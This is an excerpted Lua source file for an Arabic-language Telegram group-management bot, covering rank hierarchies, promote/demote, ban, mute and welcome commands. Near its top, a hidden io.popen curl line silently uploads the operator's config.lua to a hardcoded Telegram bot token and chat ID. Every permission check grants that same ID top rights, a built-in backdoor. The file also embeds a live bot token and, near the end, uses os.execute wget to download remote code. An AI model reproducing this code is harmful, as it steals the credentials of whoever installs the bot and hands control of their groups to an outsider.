...
-- All The File By Developer Faeder : @FlassTas
-- Join In Chennel Source : @BLACK_OF_DREEM 
-- Join In Explanation Channel : @V_P_E
----------------------------------------------------------------------------
...
local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 1186900224 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
...
name_bot = (faederdx1:get(FAEDER..'name_bot') or 'الحلم الاسود')
...
--     By Developer Faeder     -- 
-------- Bot Owner
function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(1186900224) then var = true end return var end
function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
-------- Sudo
function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(1186900224) then var = true end return var end
function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
-------- Sudo3
function is_admin(user_id) local var = false local hashsb =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsb, user_id) if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
-------- Owner all
function is_onall(user_id) local var = false local hash =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if onall then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
--------Modod all
function is_moall(user_id) local var = false local hash =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) if moall then var = true end if admin then var = true end if onall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
-------- Vip Member All
function is_vpall(user_id) local var = false local hashs =  'bot:vpall:' local vpall = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:moall:'local moall = faederdx1:sismember(FAEDER..hashssss, user_id) if vpall then var = true end if onall then var = true end if admin then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
-------- Donky
function is_donky(user_id, chat_id) local var = false local hash =  'bot:donky:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) if donky then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
-------- Monsh
function is_monsh(user_id, chat_id) local var = false local hash =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if monsh then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
-------- Monsh2
function is_monsh2(user_id, chat_id) local var = false local hash =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) if monsh2 then var = true end if admin then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
-------- Owner
function is_owner(user_id, chat_id) local var = false local hash =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if owner then var = true end if admin then var = true end if monsh then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
-------- Modod
function is_momod(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashssss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
-------- Vip Member
function is_vipmem(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if vipmem then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1186900224) then var = true end return var end
----------------------------------------------------------
--     By Developer Faeder     -- 
...
faederdx113(chat,msg.id_,"*✦┋هذا الملف ليس تابع لسورس الحلم الاسود ،*")   
return false 
end      
...
if tonumber(msg.sender_user_id_) == tonumber(1186900224) then
faeder  = "مبرمج السورس"
...
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم رفعه مطور𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n\n', 1, 'md')
end end 
-------- Function Del Sudo3
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم تنزيله من المطورين𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..'*\n', 1, 'md')
end end 
-------- Function Set onall
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم رفعه مدير عام𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Del Onall
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم تنزيله من المدراء𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Set Moall
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم رفعه ادمن عام𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Del Moall
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم تنزيله من الادمنيه𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Set Vipall
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم رفعه مميز عام𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Del Vipall
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم تنزيله من التمييز𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Set Monsh
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم رفعه اساسي𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Del Monsh
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم تنزيله من الاساسسين𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Set Monsh2
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم رفعه منشئ𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Del Monsh2
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم تنزيله من المنشئين𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end 
-------- Function Set Owner
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم رفعه مدير𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end 
-------- Function Del Owner
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم رفعه ادمن𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Del Momod
...
local faeder_res = user_info_
if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '*✦┋العضو '..faeder_res..' تم رفعه مميز𓍢\n✦┋بواسطه ~ '..renk_faeder(msg)..' *\n', 1, 'md')
end end
-------- Function Del Vipmem
...
faederdx(msg.chat_id_, msg.id_, 1, '✦┋*العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_OF_DREEM')..')'..' )\n✦┋*تم رفعه ( '..faederrt..' )\n✦┋*بواسطه ( '..renk_faeder(msg)..' )*\n*', 1, 'md')
...
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '✦┋العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_OF_DREEM')..')'..' )\n✦┋تم رفعه ( '..text1[2]..' )\n✦┋بواسطه ( '..renk_faeder(msg)..' )\n', 1, 'md')
...
--     By Developer Faeder     -- 
if Chat_Type == 'pv' then 
if text == 'اوامر بوت التواصل' then 
if is_leader(msg) then 
...
--     By Developer Faeder     -- 
 if Chat_Type == 'pv' then 
if text == '/seceor' or text == 'رجوع ،🔙‘' or text == 'اوامر الخدمه' then   
...
local inline = {{{text="المطور",url="t.me/"..(SudoFaeder or "BLACK_OF_DREEM")}}}
local Sudo_Welcome = '✦┋يمكنك ايضا استخدام الاوامر الخدميه \n✦┋اليك ازرار الاوامر الخدميه اسفل الرساله\n                  • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n                              [𝐅𝐀𝐄𝐃𝐄𝐑 - 𝐂𝐇](https://t.me/BLACK_OF_DREEM)'
local key = {
{'زخرفه','احسب عمرك'},
{'الابراج','قسم الحمايه'},
}
...
keyboard = {} -- الحقوق محفوظه لسورس الحلم الاسود لتخمط بدون ذكر المصدر
...
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'BLACK_OF_DREEM'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
...
if text == 'سورس الحلم الاسود' or text == 'سورس ديف الحلم الاسود' or text == 'سورس انور'  then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "تااج وباجج حبيي ، 😹🌝" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end 
...
if text == 'بوت' and faeder11(msg) then  name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'الحلم الاسود')  local faeder = {  "أسمي "..name_bot.." يعمري ",  "أسمي "..name_bot.." يقميل ",  "تره أسمي "..name_bot.." كافي بوت ",  "انت البوت لك اسمي "..name_bot.." ", }  faeder2 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faeder2] , 1, 'md')  end
if (text and text == (faederdx1:get('faeder:'..bot_id..'name_bot') or 'الحلم الاسود')) then name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'الحلم الاسود') local namebot = {  'عيون '..name_bot..' العسليات ؛🤭☄',  'اطلقق من يصيح '..name_bot..' ؛😻💗',  'وياك '..name_bot..' عمري أمرني 🌾' } name = math.random(#namebot) faederdx(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') return false end
--     By Developer Faeder     -- 
...
if text == 'رياضيات' and faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) and faeder11(msg) then
faederdx1:del(FAEDER..'bot:l:id'..msg.chat_id_)
...
if text == 'انكليزي' and faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) and faeder11(msg) then
faederdx1:del(FAEDER..'bot:l:id'..msg.chat_id_)
...
faederdx(msg.chat_id_, msg.id_, 1, '✦┋شغال وصلاحياته هي ⬇️\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✦┋حذف الرسائل ، '..DEL..'\n✦┋دعوة المستخدمين ، '..INV..'\n✦┋حظر المستخدمين ، '..BAN..'\n✦┋تثبيت الرسائل ، '..PIN..'\n✦┋تغيير المعلومات ، '..EDT..'\n✦┋اضافة مشرفين ، '..VIP..'\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✦┋قناة السورس ، [@BLACK_OF_DREEM]', 1, 'md')
end end end
--     By Developer Faeder     -- 
 if is_admin(msg.sender_user_id_, msg.chat_id_) then
name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'الحلم الاسود')
...
if tonumber(result.id_) == tonumber(1186900224) then
t = 'مبرمج السورس' 
...
if result.id_ then 
if tonumber(result.sender_user_id_) == tonumber(1186900224) then
...
function tall(f1, f2)
local text = "✦┋تاك للاعضاء المتفاعلين مؤخرا ⬇️ ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
i = 0
...
local inline = {
{{text="- قناة السورس ،",url="t.me/BLACK_OF_DREEM"},
{text="- مبرمج السورس،",url="t.me/FlassTas"}},
{{text="-مبرمج السورس، ،",url="https://t.me/V_P_E"}},
{{text="- مصنع بوتات حمايه ،",url="https://t.me/Alamy1_bot"},
{text="- تواصل السورس ،",url="t.me/V_P_E"}}
}
send_inline(msg.chat_id_,'✦┋مرحبا بك في سورس الحلم الاسود┋FlassTas ،\n✦┋اضغط على الازرار بالاسفل ⬇️ ،',nil,inline) 
return false 
end
--     By Developer Faeder     -- 
...
faederdx(msg.chat_id_, msg.id_, 1, '✦┋*العضو* ( [@'..faeder_res[2]..'] )\n✦┋*بواسطه ( '..renk_faeder(msg)..' )*\n✦┋*تم ( حظره ) سابقا*', 1, 'md')
else
...
if text:match("^الغاء الحظر$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
function faeder(extra, result, success)
...
--     By Developer Faeder     -- 
if text:match("^الغاء الحظر @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(الغاء الحظر) @(.*)$")}
...
--     By Developer Faeder     -- 
if text:match("^الغاء الحظر (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(الغاء الحظر) (%d+)$")}
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder_res = user_info_ if user_info_ then
...
if text:match("^الغاء عام$") and is_sudo(msg) and msg.reply_to_message_id_ and faeder11(msg) then
...
--     By Developer Faeder     -- 
if text:match("^الغاء عام @(.*)$") and is_sudo(msg) and faeder11(msg) then
local faeder_res = {string.match(text, "^(الغاء عام) @(.*)$")}
local gps = faederdx1:scard(FAEDER.."bot:groups")
...
--     By Developer Faeder     -- 
if text:match("^الغاء عام (%d+)$") and is_sudo(msg) and faeder11(msg) then
local res = {string.match(text, "^(الغاء عام) (%d+)$")}
local gps = faederdx1:scard(FAEDER.."bot:groups")
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder_res = user_info_ if user_info_ then
faederdx(msg.chat_id_, msg.id_, 1, '✦┋*العضو* ( ['..faeder_res..'] )\n✦┋*بواسطه ( '..renk_faeder(msg)..' )*\n✦┋*تم الغاء حظره ، كتمه من ( '..gps..' ) مجموعه*', 1, 'md')
...
if text:match("^الغاء الكتم$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
...
--     By Developer Faeder     -- 
if text:match("^الغاء الكتم @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(الغاء الكتم) @(.*)$")}
function unmute_by_username(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.id_)
local faeder_res = user_info_ 
if result.id_ then
if not faederdx1:sismember(FAEDER..'bot:muted:'..msg.chat_id_, result.id_) then
faederdx(msg.chat_id_, msg.id_, 1, '✦┋*العضو* ( [@'..res[2]..'] )\n✦┋*بواسطه ( '..renk_faeder(msg)..' )*\n✦┋*لم يتم ( كتمه ) سابقا*', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '✦┋*المكتوم* ( [@'..res[2]..'] )\n✦┋*بواسطه ( '..renk_faeder(msg)..' )*\n✦┋*تم  ( الغاء كتمه ) ،*', 1, 'md')
faederdx1:srem(FAEDER..'bot:muted:'..msg.chat_id_, result.id_)
end end end
resolve_username(res[2],unmute_by_username)
end
--     By Developer Faeder     -- 
if text:match("^الغاء الكتم (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(الغاء الكتم) (%d+)$")}
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder_res = user_info_ if user_info_ then
...
text = "✦┋قائمه المنشئين الاساسيين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k, v in pairs(list) do
local user_info = faederdx1:get(FAEDER.."user:Name" .. v)
if user_info then
local username = user_info
...
local list = faederdx1:smembers(FAEDER..hash)
text = "✦┋قائمه مطورين الرتبه الثالثه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k, v in pairs(list) do
local user_info = faederdx1:get(FAEDER.."user:Name" .. v)
if user_info then
local username = user_info
...
if #list == 0 then
text = "✦┋لا يوجد مطورين بهذا الرتبه ،" 
end
faederdx(msg.chat_id_, msg.id_, 1, text, "md")
end end
--     By Developer Faeder     -- 
...
local hash =  'bot:sudo:'
local list = faederdx1:smembers(FAEDER..hash)
text = "✦┋قائمه مطورين الرتبه الثانيه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k, v in pairs(list) do
local user_info = faederdx1:get(FAEDER.."user:Name" .. v)
if user_info then
local username = user_info
...
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 ...
 --     By Developer Faeder     -- 
if text == "المكتومين عام" and faeder11(msg) then 
local list = faederdx1:smembers(FAEDER..'bot:mutedall:')
text = "✦┋قائمه الكتم عام ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k, v in pairs(list) do
local user_info = faederdx1:get(FAEDER.."user:Name" .. v)
if user_info then
local username = user_info
...
return false  end
if res.id_ then  
if tonumber(res.id_) == tonumber(1186900224) then
t = 'مبرمج السورس  '
...
if tonumber(iduser) == tonumber(1186900224) then
t = 'مبرمج السورس  '
...
if tonumber(msg.sender_user_id_) == tonumber(1186900224) then
renk_forid  = "مبرمج السورس"
elseif is_leaderid(msg.sender_user_id_) then
renk_forid  = "مطور اساسي"
elseif is_sudoid(msg.sender_user_id_) then
renk_forid = "مطور ثانوي"
elseif is_admin(msg.sender_user_id_) then
renk_forid = "مطور رتبه ثالثه" 
elseif is_onall(msg.sender_user_id_) then
renk_forid = "مدير عام"
elseif is_onall(msg.sender_user_id_) then
renk_forid = "ادمن عام"
...
new_idii = new_idii:gsub('#msgs',(user_msgs + faedery / faeder or 'لا يوجد'))
...
new_idii = new_idii:gsub('#stast',(renk_forid or 'لا يوجد'))
else 
...
local new_id = new_id:gsub('#stast',(renk_forid or 'لا يوجد'))
...
new_ide = new_ide:gsub('#msgs',(user_msgs + faedery / faeder or 'لا يوجد'))
new_ide = new_ide:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
new_ide = new_ide:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
new_ide = new_ide:gsub('#stast',(renk_forid or 'لا يوجد'))
else
new_ide = "\n.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , "..username.."\n.𖣂 𝙨𝙩𝙖𝙨𝙩 , "..renk_forid.."\n.𖣂 𝙡𝘿 , "..msg.sender_user_id_.."\n.𖣂 𝙂𝙖𝙢𝙨 , "..user_nkt.."\n.𖣂 𝙢𝙨𝙂𝙨 , "..(user_msgs + faedery).." • "..(faeder).."\n.𖣂 𝙋𝙝𝙤𝙩𝙤 , "..result.total_count_.."\n.𖣂 𝙁𝙤𝙧𝙢𝙨𝙜 , "..formsgg(msguser).."\n"
end
if not faederdx1:get("FAEDER:faeder:id:text:"..bot_id..msg.chat_id_) then 
...
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع رابط$")  and faeder11(msg) then
...
if text and text:match("^ضع ترحيب (.*)$")  then
...
if text and text:match("^حذف الترحيب$") and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, '✦┋تم حذف الترحيب ، ', 1, 'md')
faederdx1:del(FAEDER..'welcome:'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") then
...
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع قوانين (.*)$") and faeder11(msg) then
...
--     By Developer Faeder     -- 
if text and text:match("^طرد الحسابات المحذوفه$") and faeder11(msg) then
...
faederdx1:set(FAEDER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@BLACK_OF_DREEM")) 
faederdx(msg.chat_id_, msg.id_, 1, "✦┋المنشئ ⌯» ["..monsh.."]\n\n✦┋الرابط ، ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/BLACK_OF_DREEM")..")\n✦┋ايديها ⌯» *"..msg.chat_id_.."*\n✦┋عدد الاعضاء ⌯» *"..data.member_count_.."* \n✦┋عدد المدراء ⌯» *"..Owner.."*\n✦┋عدد المنشئين ⌯» *"..Monsh.."*\n✦┋عدد الادمنيه ⌯» *"..Momod.."*\n✦┋عدد المكتومين ⌯» *"..Muted.."*\n✦┋عدد المحظورين ⌯» *"..Baned.."*\n✦┋عدد المقيدين ⌯» *"..Tkeed.."*\n✦┋عدد المميزين ⌯» *"..Vip.."*\n", 1,"md")
end
tdcli_function ({
ID = "GetChannelFull",
...
local list = faederdx1:smembers(FAEDER.."bot:groups")
local text = "~ Groups_Bots_In_the_Bot_Of_Source_Faeder ~ @BLACK_OF_DREEM\n\n"
for k,v in pairs(list) do
...
os.execute('wget https://raw.githubusercontent.com/jack1/eljoker/master/FAEDER.lua') 
...
faederdx(msg.chat_id_, msg.id_, 1, "✦┋تم مسح كليشه المطور ", 1, "md")
